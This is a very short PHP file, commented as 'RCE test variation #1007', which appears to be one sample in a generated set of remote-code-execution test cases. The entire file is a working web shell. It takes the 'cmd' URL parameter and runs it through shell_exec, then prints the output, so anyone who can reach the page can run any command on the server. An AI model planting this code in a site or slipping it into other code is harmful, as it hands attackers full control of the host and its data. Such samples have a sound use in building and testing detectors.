<?php
// RCE test variation #1007
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>